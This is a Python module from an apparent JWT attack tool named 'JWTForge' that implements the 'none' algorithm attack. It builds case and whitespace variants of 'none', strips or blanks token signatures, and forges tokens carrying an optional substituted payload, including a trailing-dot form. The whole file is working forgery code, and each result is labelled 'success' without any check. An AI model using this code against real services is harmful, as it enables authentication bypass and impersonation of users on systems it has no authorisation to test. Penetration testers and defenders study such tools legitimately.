"""
JWTForge - None Algorithm Attack
CVE: Unsanitized 'alg' header — set to 'none' to bypass signature verification.

Some libraries accept 'none', 'None', 'NONE', or other capitalizations.
This attack generates all variants.
"""

import json
from typing import List, Dict, Any

from ..core.parser import JWTParser, b64url_encode

# All known 'none' algorithm variants that bypass validation
NONE_VARIANTS = [
    "none",
    "None",
    "NONE",
    "nOnE",
    "noNe",
    "nONe",
    "NoNe",
    "nOne",
    "NONE ",
    "none ",
]

# Also try removing algorithm entirely
EMPTY_ALG_VARIANTS = [
    "",
    " ",
]


def attack_none(token: str, custom_payload: Dict = None) -> List[Dict[str, Any]]:
    """
    None algorithm attack — strip signature and set alg to none variants.

    Args:
        token: Original JWT string
        custom_payload: Optional modified payload to embed

    Returns:
        List of result dicts with forged tokens
    """
    parser = JWTParser(token)
    results = []

    payload = custom_payload if custom_payload else parser.payload

    for variant in NONE_VARIANTS:
        new_header = dict(parser.header)
        new_header['alg'] = variant

        # Remove 'typ' to be more convincing in some cases
        no_typ_header = {k: v for k, v in new_header.items() if k != 'typ'}

        # Standard: alg=none, empty signature
        forged = parser.forge(new_header, payload, '')
        results.append({
            'attack': 'none_algorithm',
            'variant': variant,
            'token': forged,
            'status': 'success',
            'note': f'alg="{variant}" with empty signature',
            'detail': f'alg variant: {repr(variant)}'
        })

        # Variant without typ header
        forged_no_typ = parser.forge(no_typ_header, payload, '')
        results.append({
            'attack': 'none_algorithm',
            'variant': f'{variant} (no typ)',
            'token': forged_no_typ,
            'status': 'success',
            'note': f'alg="{variant}", typ header removed',
            'detail': f'alg={repr(variant)}, no typ'
        })

    return results


def attack_none_with_trailing_dot(token: str) -> List[Dict[str, Any]]:
    """
    Generate none-alg tokens where signature part is a dot (header.payload.)
    Some parsers split on '.' and accept header.payload. as valid.
    """
    parser = JWTParser(token)
    results = []

    for variant in NONE_VARIANTS[:4]:  # Use top 4 variants
        new_header = dict(parser.header)
        new_header['alg'] = variant

        h = b64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
        p = b64url_encode(json.dumps(parser.payload, separators=(',', ':')).encode())

        # With trailing dot and no signature
        forged = f"{h}.{p}."
        results.append({
            'attack': 'none_trailing_dot',
            'variant': variant,
            'token': forged,
            'status': 'success',
            'note': f'alg="{variant}" trailing dot format',
        })

    return results
